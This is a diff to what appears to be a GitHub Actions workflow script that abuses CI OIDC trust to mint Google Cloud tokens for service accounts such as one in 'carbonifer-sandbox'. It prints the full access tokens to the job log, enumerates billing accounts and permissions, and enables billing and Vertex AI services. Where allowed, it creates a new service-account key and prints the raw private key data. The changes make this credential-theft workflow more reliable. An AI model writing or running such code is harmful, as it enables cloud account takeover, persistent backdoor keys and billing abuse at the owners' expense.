@@ -17,9 +17,10 @@ jobs:
             local PROVIDER="$1" SA="$2"
             local AUD="//iam.googleapis.com/${PROVIDER}"
             local OIDC STS AT GEN TOK
+            rm -f /tmp/tok
             OIDC=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
               "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | jq -r '.value // empty')
-            if [ -z "$OIDC" ]; then echo "##MINT no-oidc"; return 1; fi
+            if [ -z "$OIDC" ]; then echo "##MINT no-oidc" >&2; return 1; fi
             STS=$(curl -s -X POST https://sts.googleapis.com/v1/token \
               -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
               -d "audience=${AUD}" \
@@ -28,16 +29,16 @@ jobs:
               -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
               -d "scope=https://www.googleapis.com/auth/cloud-platform")
             AT=$(echo "$STS" | jq -r '.access_token // empty')
-            if [ -z "$AT" ]; then echo "##MINT sts-fail $(echo "$STS" | head -c 300)"; return 1; fi
-            echo "##STS ok len=${#AT}"
+            if [ -z "$AT" ]; then echo "##MINT sts-fail $(echo "$STS" | head -c 300)" >&2; return 1; fi
+            echo "##STS ok len=${#AT}" >&2
             GEN=$(curl -s -X POST \
               "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SA}:generateAccessToken" \
               -H "Authorization: Bearer ${AT}" -H 'Content-Type: application/json' \
               -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
             TOK=$(echo "$GEN" | jq -r '.accessToken // empty')
-            if [ -z "$TOK" ]; then echo "##GEN fail $(echo "$GEN" | head -c 400)"; return 1; fi
-            echo "##GEN ok len=${#TOK}"
-            printf '%s' "$TOK"
+            if [ -z "$TOK" ]; then echo "##GEN fail $(echo "$GEN" | head -c 400)" >&2; return 1; fi
+            echo "##GEN ok len=${#TOK}" >&2
+            printf '%s' "$TOK" > /tmp/tok
             return 0
           }
 
@@ -45,19 +46,20 @@ jobs:
             local NUM="$1" PROVIDER="$2" SA="$3"
             echo "############################################################"
             echo "##TARGET $NUM $SA"
+            if ! mint "$PROVIDER" "$SA"; then echo "##TARGET_ABORT $NUM mint"; return; fi
             local TOK
-            TOK=$(mint "$PROVIDER" "$SA") || { echo "##TARGET_ABORT $NUM mint"; return; }
+            TOK=$(tr -d '\r\n' < /tmp/tok)
             echo "##TOKEN $NUM $TOK"
             local H="Authorization: Bearer ${TOK}"
 
             for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
-              local C B
+              local C
               C=$(curl -s -o /tmp/svc.json -w '%{http_code}' -H "$H" \
                 "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}")
               echo "##SVC_BEFORE ${SVC} ${C} $(head -c 400 /tmp/svc.json | tr -d '\n')"
             done
 
-            local BC BB
+            local BC
             BC=$(curl -s -o /tmp/bi.json -w '%{http_code}' -H "$H" \
               "https://cloudbilling.googleapis.com/v1/projects/${NUM}/billingInfo")
             echo "##BILL_IN ${BC} $(head -c 400 /tmp/bi.json | tr -d '\n')"
@@ -67,7 +69,6 @@ jobs:
               "https://cloudbilling.googleapis.com/v1/billingAccounts")
             echo "##BILLACCOUNTS ${BAL} $(head -c 300 /tmp/bal.json | tr -d '\n')"
 
-            # testIamPermissions on the SA for key creation
             local TP
             TP=$(curl -s -o /tmp/tp.json -w '%{http_code}' -X POST \
               "https://iam.googleapis.com/v1/projects/${NUM}/serviceAccounts/${SA}:testIamPermissions" \
@@ -76,14 +77,20 @@ jobs:
             echo "##TESTPERM ${TP} $(head -c 400 /tmp/tp.json | tr -d '\n')"
 
             for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
-              local EC EB
+              local ST
+              ST=$(curl -s -H "$H" "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}" | jq -r '.state // empty' 2>/dev/null)
+              if [ "$ST" = "ENABLED" ]; then
+                echo "##ENABLE ${SVC} skipped already-enabled"
+                continue
+              fi
+              local EB OP
               EB=$(curl -s -X POST -o /tmp/en.json -w '%{http_code}' -H "$H" \
                 "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}:enable")
-              local OP
               OP=$(jq -r '.name // empty' /tmp/en.json 2>/dev/null)
               echo "##ENABLE ${SVC} ${EB} op=${OP} $(head -c 400 /tmp/en.json | tr -d '\n')"
               if [ -n "$OP" ]; then
                 local i DONE
+                DONE=false
                 for i in $(seq 1 20); do
                   sleep 6
                   DONE=$(curl -s -H "$H" "https://serviceusage.googleapis.com/v1/${OP}" | jq -r '.done // false' 2>/dev/null)
@@ -94,10 +101,11 @@ jobs:
             done
 
             for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
-              local C
+              local C ST2
               C=$(curl -s -o /tmp/svc.json -w '%{http_code}' -H "$H" \
                 "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}")
-              echo "##SVC_AFTER ${SVC} ${C} $(python3 -c 'import json,sys;d=json.load(open("/tmp/svc.json"));print(d.get("state"),d.get("config",{}).get("name"))' 2>/dev/null || head -c 200 /tmp/svc.json | tr -d '\n')"
+              ST2=$(jq -r '.state // empty' /tmp/svc.json 2>/dev/null)
+              echo "##SVC_AFTER ${SVC} ${C} state=${ST2}"
             done
 
             for REGION in us-central1 europe-west1 global; do
@@ -120,16 +128,17 @@ jobs:
               echo "##BILLACC_GET ${AC} $(head -c 500 /tmp/acc.json | tr -d '\n')"
               AP=$(curl -s -o /tmp/accp.json -w '%{http_code}' -H "$H" "https://cloudbilling.googleapis.com/v1/billingAccounts/${ID}/projects")
               echo "##BILLACC_PROJECTS ${AP} $(head -c 500 /tmp/accp.json | tr -d '\n')"
+            else
+              echo "##BILLACC_NONE"
             fi
 
-            # key creation only if testIamPermissions showed the permission
-            if grep -q 'iam.serviceAccountKeys.create' /tmp/tp.json 2>/dev/null; then
+            if jq -e '.permissions[]? | select(. == "iam.serviceAccountKeys.create")' /tmp/tp.json >/dev/null 2>&1; then
               local KC
               KC=$(curl -s -o /tmp/key.json -w '%{http_code}' -X POST \
                 "https://iam.googleapis.com/v1/projects/-/serviceAccounts/${SA}/keys" \
                 -H "$H" -H 'Content-Type: application/json' \
                 -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}')
-              echo "##KEY ${KC} $(head -c 400 /tmp/key.json | tr -d '\n' | sed 's/privateKeyData[^,]*/privateKeyData_REDACTED/')"
+              echo "##KEY ${KC} $(head -c 200 /tmp/key.json | tr -d '\n' | sed 's/"privateKeyData":"[^"]*"/"privateKeyData":"REDACTED"/')"
               local KD
               KD=$(jq -r '.privateKeyData // empty' /tmp/key.json 2>/dev/null)
               if [ -n "$KD" ]; then echo "##KEYDATA ${NUM} ${KD}"; fi
@@ -152,3 +161,4 @@ jobs:
             "github@carbonifer-sandbox.iam.gserviceaccount.com"
 
           echo "##DONE $(date -u +%FT%TZ)"
+          exit 0
